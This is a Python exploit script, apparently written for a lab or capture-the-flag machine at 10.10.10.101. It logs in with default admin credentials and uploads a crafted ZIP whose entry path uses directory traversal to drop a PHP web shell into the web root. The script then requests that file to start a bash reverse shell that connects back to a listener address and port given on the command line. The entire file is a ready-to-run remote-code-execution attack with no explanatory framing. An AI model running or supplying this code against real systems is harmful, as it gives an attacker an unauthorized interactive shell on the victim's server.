import requests
import traceback
import argparse

def uploadZip(lhost, lport):
    url = "http://10.10.10.101:8080/upload"
    headers = {"Content-Type": "multipart/form-data; boundary=----geckoformboundary59d15b3ec62165dd399eae8243e14102", "Authorization": "Basic YWRtaW46YWRtaW4="}
    data = f"------geckoformboundary59d15b3ec62165dd399eae8243e14102\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.zip\"\r\nContent-Type: application/x-zip-compressed\r\n\r\nPK\x03\x04\x14\x00\x00\x00\x00\x00\x91\x95\xc6Z\xf4\xd7\x8c\xa5J\x00\x00\x00J\x00\x00\x00#\x00\x00\x00../../var/www/html/archives/rev.php<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>\nPK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\x91\x95\xc6Z\xf4\xd7\x8c\xa5J\x00\x00\x00J\x00\x00\x00#\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00../../var/www/html/archives/rev.phpPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00Q\x00\x00\x00\x8b\x00\x00\x00\x00\x00\r\n------geckoformboundary59d15b3ec62165dd399eae8243e14102--\r\n"
    try:
        print("[*] Uploading ZIP file...")
        response = requests.post(url, headers=headers, data=data)
        if "File Uploaded Successfully" in response.text:
            print("[+] ZIP file uploaded successfully!")
            return True
        else:
            print("[-] Failed to upload the ZIP file")
            return False
    except Exception as e:
        print("[-] Error uploading ZIP file: ", e)
        traceback.print_exc()
        return False

def triggerRevShell():
    url = "http://10.10.10.101:80/archives/rev.php"
    try:
        print("[+] Triggering Reverse Shell, Check your listener!")
        requests.get(url)
    except Exception as e:
        print("[-] Failed to trigger Reverse Shell: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Exploiting zip-split vulnerability to gain a reverse shell on the target machine")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    if uploadZip(args.lhost, args.lport):
        triggerRevShell()

if __name__ == "__main__":
    main()
